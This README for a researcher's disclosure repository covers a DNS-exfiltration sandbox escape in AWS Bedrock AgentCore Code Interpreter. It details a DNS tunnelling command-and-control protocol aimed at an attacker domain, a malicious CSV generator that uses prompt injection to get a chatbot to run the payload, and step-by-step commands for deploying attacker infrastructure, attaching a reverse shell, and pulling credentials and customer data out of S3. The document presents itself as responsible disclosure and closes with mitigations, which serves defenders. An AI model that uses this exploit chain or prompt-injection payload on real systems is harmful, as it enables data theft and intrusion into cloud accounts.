# AWS Bedrock AgentCore Code Interpreter DNS Exfiltration Vulnerability

**Vulnerability Disclosure**: [HackerOne Report #3323153](https://hackerone.com/bugs?subject=user&report_id=3323153&view=open&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=pending-program-review&substates%5B%5D=triaged&substates%5B%5D=retesting&reported_to_team=&text_query=&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=25&page=1)

## Summary

AWS Bedrock AgentCore Code Interpreter's "Sandbox" network mode fails to properly isolate the environment from external network access. Despite being configured with no external network access, the sandboxed Code Interpreter can still make DNS queries, enabling **complete bypass of sandbox restrictions** by smuggling DNS-based command & control. Specifically, the Code Interpreter can query `A` and `AAAA` DNS records. During this research, I developed a DNS tunneling protocol that allows bidirectional communication via DNS queries and responses, enabling a full interactive reverse shell.

## Likelihood

If you're wondering how likely this is to occur in practice, consider that chatbots often execute arbitrary Python code on behalf of the user; if an attacker can influence this code execution (via direct prompt injection or convincing the code interpreter to execute a separate script), the Code Interpreter is arguably functioning as designed. However, the "Sandbox" mode is supposed to be walled off from the internet - and is **not** working as designed due to the DNS query leakage. An attacker can leverage this code execution to exfiltrate data and execute commands outside the sandbox and establish a reverse shell using the protocol demonstrated here. As shown in the proof of concept, this includes the ability to exfiltrate sensitive data, such as exfiltrating data from S3 buckets or DynamoDB tables, as well as execute any AWS API calls permitted by the Code Interpreter's IAM role.

## Technical Details

### Attack and Protocol Architecture

![Architecture](architecture.png)
<!-- My excalidraw diagram - for personal reference: https://app.excalidraw.com/s/2ccs041sIwg/3RssES9GIZW -->

The attack flow works as follows:

1. **Command Delivery**: Operator sends commands via HTTP API (port 8080) to the DNS C2 server running on EC2. The server encodes commands as base64 and splits them into 3-character chunks. Each chunk is encoded in an IP address where octets 2-4 contain ASCII values of the characters.

2. **Data Exfiltration**: The sandboxed Code Interpreter makes DNS queries that Route53 delegates to the C2 server via nameserver (NS) records. Output is base64-encoded and embedded in DNS subdomain queries. The C2 server extracts the data from these queries and makes it available to the operator via the HTTP API.

3. **Sandbox Bypass**: Despite "no network access" configuration, DNS queries egress from the sandbox. Route53 nameserver delegation ensures all DNS queries for the C2 domain reach the attacker-controlled DNS server on EC2.

### Command Delivery (Server → Client via A Record Responses)

Commands are base64-encoded and split into 3-character chunks. Each chunk is encoded in an IP address response where octets 2-4 contain ASCII values of the characters, and octet 1 is a continuation flag:

```text
Client queries: c0.sess_abc123.c2.bt-research-control.com
Server responds: 10.100.50.104
                 ↑  ↑   ↑  ↑
                 │  │   │  └─ ASCII 104 = 'h'
                 │  │   └──── ASCII 50  = '2'
                 │  └──────── ASCII 100 = 'd'
                 └─────────── 10 = more chunks, 11 = last chunk

Example (command "whoami" → base64 "d2hvYW1p"):
  c0: 10.100.50.104   → "d2h"
  c1: 10.111.89.87    → "oYW"
  c2: 10.49.112.0     → "1p"
  c3: 11.105.0.0      → "i" (last chunk)
```

### Data Exfiltration (Client → Server via A Record Queries)

Output is base64-encoded and embedded in DNS subdomain queries. DNS-safe encoding replaces `=` with `-`. Multiple cache-busting fields ensure each query is unique:

```text
Query: 1.1.22.1234.MjAyNS0wOC0yMSAyMDoyMDo1NA-.1.sess_abc123.c2.bt-research-control.com
       ↑ ↑ ↑  ↑    ↑                          ↑ ↑            ↑
       │ │ │  │    │                          │ └─ Session ID
       │ │ │  │    │                          └─── cmd_seq (cache bust)
       │ │ │  │    └────────────────────────────── Base64 output chunk (convert '=' to '-' to keep text DNS-safe)
       │ │ │  └─────────────────────────────────── Timestamp (cache bust)
       │ │ └────────────────────────────────────── Total chunks
       │ └──────────────────────────────────────── Chunk number
       └─────────────────────────────────────────── Command sequence (cache bust)

Large outputs split into multiple chunks (60 chars max per label):
  Chunk 1:  1.1.22.1234.MjAyNS0wOC0yMSAyMDoyMDo1NCBhZ2VudC1nb2F0LTQ0NTU3MDkyMTI5.1.sess_abc123.c2.bt-research-control.com
  Chunk 2:  1.2.22.1235.OAoyMDI1LTA4LTIwIDE5OjEyOjQ2IGFnZW50LWdvYXQtZGVtby1idWN.1.sess_abc123.c2.bt-research-control.com
  ...
  Chunk 22: 1.22.22.1256.dGVzLXVzLWVhc3QtMS00NDU1NzA5MjEyOTg-.1.sess_abc123.c2.bt-research-control.com
```

## Project Structure

This repository now contains two separate infrastructures to demonstrate a realistic attack scenario:

```
agentcore-sandbox-breakout/
├── attacker-infra/          # Attacker's AWS account
│   ├── terraform/           # C2 server infrastructure (EC2, Route53, DNS)
│   ├── src/                 # Attack tools and C2 client
│   │   ├── attacker_shell.py    # Operator interface
│   │   ├── attack_client.py     # HTTP client for prompt injection
│   │   ├── csv_payload_generator.py  # Malicious CSV generator
│   │   └── payload_client.py    # Payload for Code Interpreter
│   └── Makefile
│
├── victim-infra/            # Victim's AWS account
│   ├── terraform/           # Chatbot infrastructure (ECS, ALB, AgentCore)
│   ├── chatbot/             # Vulnerable FastAPI application
│   └── Makefile
│
├── docs/                    # Technical specifications
└── Makefile                 # Root Makefile for orchestration
```

## Realistic Attack Demo (No Credentials Required)

The enhanced demo shows that an attacker with **NO AWS credentials** to the victim's account can exfiltrate sensitive data. The attack flow:

1. **Attacker** deploys C2 server infrastructure
2. **Victim** has a publicly-accessible AI chatbot (uses AgentCore Code Interpreter)
3. **Attacker** sends malicious CSV with prompt injection to victim's public API
4. **Chatbot** passes CSV to Code Interpreter for analysis
5. **Prompt injection** triggers DNS C2 payload execution
6. **Data exfiltrates** via DNS to attacker's C2 server

### Quick Start (Realistic Demo)

```bash
# Terminal 1: Deploy attacker infrastructure
cd attacker-infra
make terraform-yolo
source set_env_vars.sh

# Terminal 2: Deploy victim infrastructure (separate AWS account recommended)
cd victim-infra
make deploy

# Terminal 1: Launch attack (note the session ID in output)
make attack TARGET=$(cd ../victim-infra/terraform && terraform output -raw chatbot_url)

# Terminal 1: Attach to compromised session (use session ID from attack output)
make attach SESSION=sess_abc123
# In operator shell:
# > whoami
# > aws s3 ls
# > aws dynamodb list-tables
```

---

## Attacker Infrastructure Setup

### Prerequisites

- AWS CLI configured
- Python 3.12
- Terraform installed with the latest provider

### Step 1: Deploy C2 Infrastructure

First, edit the `attacker-infra/terraform/terraform.tfvars` file to set your domain name and AWS region:

```bash
export DOMAIN_NAME="bt-research-control.com"
export REGION="us-east-1"
export BUCKET_NAME="agentcore-hacking"
cat << EOF >> attacker-infra/terraform/terraform.tfvars
domain_name = "${DOMAIN_NAME}"
aws_region = "${REGION}"
s3_bucket_name = "${BUCKET_NAME}"
EOF
```

Deploy the C2 server infrastructure:

```bash
cd attacker-infra

# Deploy infrastructure
make terraform-yolo
source set_env_vars.sh
```

### Step 2: Generate and Send Malicious Payload

Generate a malicious CSV with embedded payload:

```bash
make generate-csv
```

Then either:
- **Automated**: `make attack TARGET=https://victim-chatbot.com`
- **Manual**: Upload the generated CSV to the victim chatbot web UI

### Step 3: Attach to Session

Use the session ID from the payload generation step:

```bash
make attach SESSION=sess_abc123
```

### Step 4: Verify DNS Exfiltration

Now that you are in the interactive shell, you can verify that DNS exfiltration is working by executing these example commands.

> [!WARNING]
> Note: NONE of these commands should return data via DNS requests in a properly isolated sandbox environment with no network access.

1. Check the current user:

Command:

```bash
whoami
```

Output:

```bash
genesis1ptools
```

![whoami.png](docs/images/whoami.png)

2. List S3 buckets:

Command:

```bash
aws s3 ls
aws s3 ls s3://agentcore-hacking-sensitive-data --recursive
```

Output:

```
# aws s3 ls

2025-10-19 08:23:50 agentcore-hacking
2025-10-19 10:36:59 agentcore-hacking-sensitive-data

# aws s3 ls s3://agentcore-hacking-sensitive-data/ --recursive
2025-10-19 10:37:00        220 credentials/api-keys.json
2025-10-19 10:37:00        228 customer-data/users-export.csv
2025-10-19 10:37:00        153 financial/Q3-2024-revenue.csv
```

![aws-s3-ls.png](docs/images/aws-s3-ls.png)

3. Exfiltrate sensitive S3 file contents:

Commands:

```bash
# 3. Exfiltrate sensitive S3 file contents
aws s3 cp s3://agentcore-hacking-sensitive-data/customer-data/users-export.csv -
aws s3 cp s3://agentcore-hacking-sensitive-data/credentials/api-keys.json -
aws s3 cp s3://agentcore-hacking-sensitive-data/financial/Q3-2024-revenue.csv -
````

Output:

```
# users-export.csv
user_id,email,name,phone,ssn_last4
1001,john.doe@example.com,John Doe,555-0101,1234
1002,jane.smith@example.com,Jane Smith,555-0102,5678
1003,bob.wilson@example.com,Bob Wilson,555-0103,9012
NOTE: Contains PII - Handle with care

# api-keys.json
{
  "service": "payment-gateway",
  "api_key": "pk_live_FakeKey",
  "api_secret": "sk_live_FakeSecret",
  "environment": "production",
  "note": "DO NOT SHARE - CONFIDENTIAL"
}

# Q3-2024-revenue.csv
Date,Department,Revenue,Confidential
2024-07-01,Sales,125000,Yes
2024-08-01,Sales,138000,Yes
2024-09-01,Sales,142000,Yes
Total,Sales,405000,CONFIDENTIAL
```

Screenshot:

![aws-s3-cp.png](docs/images/aws-s3-cp.png)

### Step 4: Cleanup

You can exit the interactive shell by typing `exit` or pressing `Ctrl+D`. Then, destroy the deployed infrastructure with the following command:

```bash
make terraform-destroy
```

## Security Impact

### Attack Prerequisites

An attacker needs only one condition:
- **Influence code execution** in the Code Interpreter (via prompt injection, malicious dependencies, or AI-generated code)

Once code execution is achieved, the sandbox does not provide sufficient protection against data exfiltration via `A` or `AAAA` records.

### Real-World Attack Scenarios

**Prompt Injection**: Chatbots executing arbitrary Python based on user input are common in AI agent architectures. Example: "Please analyze this data and send a summary to my server at example.com"

**Malicious Dependencies/Supply Chain Risk**: Code Interpreter includes **270+** third party dependencies (see the list of Pre-installed libraries [here](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/code-interpreter-preinstalled-libraries.html)), including pandas, numpy, and other data science packages. A compromised package could establish C2 using this method when importing the python package.

**AI Code Generation**: When AI generates Python code for data analysis, attackers can manipulate prompts to include exfiltration logic that appears legitimate.

### IAM Role Exploitation

The Code Interpreter requires an IAM role to access AWS resources. However, it is easy to assign an overprivileged role to Code Interpreter because it can use an IAM role that is otherwise meant for other parts of the AgentCore service. This is because the trust policy on the role must match the service `bedrock-agentcore.amazonaws.com`, which can be assumed by Code Interpreter, Runtime, or Gateway - all of which have different needs for permissions. An AgentCore gateway role may need `secretsmanager:GetSecretValue`, but a Code Interpreter certainly does not.

Additionally, the AgentCore role can be easily assigned excessive permissions. In fact, the AgentCore Starter Toolkit Default Role (declared [here](https://github.com/aws/bedrock-agentcore-starter-toolkit/blob/8b8afb5a579524df56ba94ea93e3f286a828b716/src/bedrock_agentcore_starter_toolkit/operations/gateway/constants.py#L47)) actually grants very broad permissions, including full DynamoDB access, full access to all Secrets Manager secrets, and full S3 read access to all buckets in the account. This is far beyond the principle of least privilege - and the Code Interpreter role (which can be assigned this same role) should never have such broad access, especially since the Code Interpreter can be tricked into exfiltrating data from these services via DNS.

## Responsible Disclosure

Reported to AWS via HackerOne vulnerability disclosure program (Report #3323153).

## Mitigation

**AWS Service-Side Fix Required:**

The vulnerability exists in AWS Bedrock AgentCore Code Interpreter's sandbox implementation. AWS must block outbound DNS traffic from Code Interpreter instances when "Sandbox" network mode is configured.

**Interim Workarounds for Users:**

Until AWS fixes the service:
- **Do not rely on "Sandbox" mode** for network isolation
- **Use VPC mode** with proper isolation:
  - No NAT Gateway or Internet Gateway attached to VPC
  - VPC endpoints for required AWS services only (S3, DynamoDB, etc.)
  - VPC endpoint policies restricting access to specific resources (e.g., S3 endpoint limited to allowlist of buckets, not `*`)
- **Apply least-privilege IAM policies** to Code Interpreter roles (specific resources, not `*`)
- **Monitor CloudWatch logs** for unexpected Code Interpreter activity
